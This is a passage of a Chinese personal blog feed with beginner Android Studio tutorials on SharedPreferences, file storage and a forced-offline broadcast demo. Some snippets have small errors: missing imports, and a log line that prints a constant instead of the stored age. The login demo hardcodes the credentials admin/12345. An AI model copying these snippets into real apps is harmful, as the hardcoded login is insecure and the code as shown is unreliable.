class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.sharedpreferences;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> Bean.test;<br><span class="hljs-keyword">import</span> android.content.SharedPreferences;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> EditText editText=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button button=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button restore=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        editText=(EditText) findViewById(R.id.textView);<br>        button=(Button)findViewById(R.id.save_button);<br>        restore=(Button)findViewById(R.id.restore_button);<br>        <span class="hljs-comment">//监听点击事件</span><br>        restore.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 读取存储的内容</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-comment">//打开存储文件</span><br>                SharedPreferences pref=getSharedPreferences(<span class="hljs-string">&quot;data&quot;</span><br>                        ,MODE_PRIVATE);<br>                <span class="hljs-comment">//获取具体内容 并设置默认值</span><br>                String name=pref.getString(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-keyword">int</span> age=pref.getInt(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">18</span>);<br>                <span class="hljs-keyword">boolean</span> married=pref.getBoolean(<span class="hljs-string">&quot;married&quot;</span>,<span class="hljs-keyword">false</span>);<br>                Log.d(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>+name);<br>                Log.d(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>+<span class="hljs-number">18</span>);<br>                Log.d(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;married&quot;</span>+married);<br>            &#125;<br>        &#125;);<br><br>        button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 存储轻量级内容</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-comment">//创建SharedPreferences准备存储内容</span><br>                SharedPreferences.Editor editor=getSharedPreferences(<span class="hljs-string">&quot;data&quot;</span>,MODE_PRIVATE).edit();<br>                <span class="hljs-comment">//具体内容存入</span><br>                editor.putString(<span class="hljs-string">&quot;name&quot;</span>,editText.getText().toString());<br>                editor.putInt(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">12</span>);<br>                editor.putBoolean(<span class="hljs-string">&quot;married&quot;</span>,<span class="hljs-keyword">false</span>);<br>                <span class="hljs-comment">//具体内容存入</span><br>                editor.apply();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 文件存储</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-文件存储"><a href="#Android-Studio-文件存储" class="headerlink" title="Android Studio 文件存储"></a>Android Studio 文件存储</h1><p>用户输入后销毁时保存</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.filepersistencetest;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><br><span class="hljs-keyword">import</span> java.io.BufferedWriter;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStreamWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> EditText editText;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">//给editText赋值文本框</span><br>        editText=(EditText)findViewById(R.id.editText);<br>        <span class="hljs-comment">//利用函数获取内容</span><br>        String inputText=load();<br>        <span class="hljs-comment">//加载内容进入</span><br>        <span class="hljs-keyword">if</span>(!TextUtils.isEmpty(inputText))&#123;<br>            editText.setText(inputText);<br>            editText.setSelection(inputText.length());<br>            Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;来个信息&quot;</span>,Toast.LENGTH_SHORT).show();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//重构消除时的代码进行保存</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">super</span>.onDestroy();<br>        String inputText=editText.getText().toString();<br>        save(inputText);<br>    &#125;<br>    <span class="hljs-comment">//构建保存代码</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">(String inputText)</span></span>&#123;<br>        FileOutputStream out=<span class="hljs-keyword">null</span>;<br>        BufferedWriter writer=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            out=openFileOutput(<span class="hljs-string">&quot;data&quot;</span>, Context.MODE_PRIVATE);<br>            writer=<span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(out));<br>            writer.write(inputText);<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-keyword">if</span>(writer!=<span class="hljs-keyword">null</span>)&#123;<br>                    writer.close();<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//加载已经保存的内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">load</span><span class="hljs-params">()</span></span>&#123;<br>        FileInputStream in=<span class="hljs-keyword">null</span>;<br>        BufferedReader reader=<span class="hljs-keyword">null</span>;<br>        StringBuilder content=<span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//获取文件内容</span><br>            in=openFileInput(<span class="hljs-string">&quot;data&quot;</span>);<br>            reader=<span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(in));<br>            String line=<span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">while</span> ((line=reader.readLine())!=<span class="hljs-keyword">null</span>)&#123;<br>                content.append(line);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(reader!=<span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    reader.close();<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> content.toString();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>界面文档</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/editText&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:hint</span>=<span class="hljs-string">&quot;Type something here&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 综合实例_强制下线</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20%E7%BB%BC%E5%90%88%E5%AE%9E%E4%BE%8B_%E5%BC%BA%E5%88%B6%E4%B8%8B%E7%BA%BF/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20%E7%BB%BC%E5%90%88%E5%AE%9E%E4%BE%8B_%E5%BC%BA%E5%88%B6%E4%B8%8B%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-综合实例-强制下线"><a href="#Android-Studio-综合实例-强制下线" class="headerlink" title="Android Studio 综合实例_强制下线"></a>Android Studio 综合实例_强制下线</h1><h2 id="ActivityCollector-java"><a href="#ActivityCollector-java" class="headerlink" title="ActivityCollector.java"></a>ActivityCollector.java</h2><p>管理所有活动的。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcastbestpractive;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActivityCollector</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Activity&gt; activities=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addActivity</span><span class="hljs-params">(Activity activity)</span></span>&#123;<br>        activities.add(activity);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">removeActivity</span><span class="hljs-params">(Activity activity)</span></span>&#123;<br>        activities.remove(activity);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finishAll</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">for</span> (Activity activity:activities)&#123;<br>            <span class="hljs-keyword">if</span>(!activity.isFinishing())&#123;<br>                activity.finish();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="BaseActivity-java"><a href="#BaseActivity-java" class="headerlink" title="BaseActivity.java"></a>BaseActivity.java</h2><p>相关Android的生命周期参考<a href="https://blog.csdn.net/xiajun2356033/article/details/78741121?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1328769.578.16172662242181723&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcastbestpractive;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.app.AlertDialog;<br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.DialogInterface;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.content.IntentFilter;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> ForceOfflineReceiver receiver;<br>    <span class="hljs-comment">//所有的活动都可以继承的父类</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle saveInstanceState)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(saveInstanceState);<br>        ActivityCollector.addActivity(<span class="hljs-keyword">this</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onDestroy();<br>        ActivityCollector.removeActivity(<span class="hljs-keyword">this</span>);<br>    &#125;<br>    <span class="hljs-comment">//自己理解为最顶层的正在运行的Activity接受</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResume</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onResume();<br>        IntentFilter intentFilter=<span class="hljs-keyword">new</span> IntentFilter();<br>        intentFilter.addAction(<span class="hljs-string">&quot;com.example.broadcastbestpractice.FORCE_OFFLINE&quot;</span>);<br>        receiver=<span class="hljs-keyword">new</span> ForceOfflineReceiver();<br>        registerReceiver(receiver,intentFilter);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onPause</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onPause();<br>        <span class="hljs-keyword">if</span>(receiver!=<span class="hljs-keyword">null</span>)&#123;<br>            unregisterReceiver(receiver);<br>            receiver=<span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForceOfflineReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BroadcastReceiver</span></span>&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>&#123;<br>            AlertDialog.Builder builder=<span class="hljs-keyword">new</span> AlertDialog.Builder(context);<br>            builder.setTitle(<span class="hljs-string">&quot;Warning&quot;</span>);<br>            builder.setMessage(<span class="hljs-string">&quot;即将强制下线&quot;</span>);<br>            <span class="hljs-comment">//设置不能使用back进行返回</span><br>            builder.setCancelable(<span class="hljs-keyword">false</span>);<br>            <span class="hljs-comment">//设置按钮并进行监听</span><br>            builder.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> DialogInterface.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(DialogInterface dialog, <span class="hljs-keyword">int</span> which)</span> </span>&#123;<br>                    ActivityCollector.finishAll();<span class="hljs-comment">//销毁所有活动</span><br>                    <span class="hljs-comment">//跳转界面</span><br>                    Intent intent=<span class="hljs-keyword">new</span> Intent(context,LoginActivity.class);<br>                    context.startActivity(intent);<br>                &#125;<br>            &#125;);<br>            builder.show();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="登录界面代码"><a href="#登录界面代码" class="headerlink" title="登录界面代码"></a>登录界面代码</h2><p>LoginActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcastbestpractive;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-comment">//需要将该活动继承至BaseActivity从而方便广播</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseActivity</span> </span>&#123;<br>    <span class="hljs-comment">//建立对应的按钮或文本变量</span><br>    <span class="hljs-keyword">private</span> EditText accountEdit;<br>    <span class="hljs-keyword">private</span> EditText pwEdit;<br>    <span class="hljs-keyword">private</span> Button login;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_login);<br>        <span class="hljs-comment">//获取对应按钮或文本的内容根据id</span><br>        accountEdit=(EditText)findViewById(R.id.accountEdit);<br>        pwEdit=(EditText)findViewById(R.id.pwEdit);<br>        login=(Button)findViewById(R.id.login);<br>        <span class="hljs-comment">//对login按钮进行监听</span><br>        login.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                String account=accountEdit.getText().toString();<br>                String pw=pwEdit.getText().toString();<br>                <span class="hljs-keyword">if</span> (account.equals(<span class="hljs-string">&quot;admin&quot;</span>)&amp;&amp;pw.equals(<span class="hljs-string">&quot;12345&quot;</span>))&#123;<br>                    <span class="hljs-comment">//若账户密码正确进行跳转</span><br>                    Intent intent=<span class="hljs-keyword">new</span> Intent(LoginActivity.<span class="hljs-keyword">this</span>,MainActivity.class);<br>                    startActivity((intent));<br>                    finish();<br>                &#125;<span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">//进行提示账号或密码错误</span><br>                    Toast.makeText(LoginActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;account or password is invalid&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity_login.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 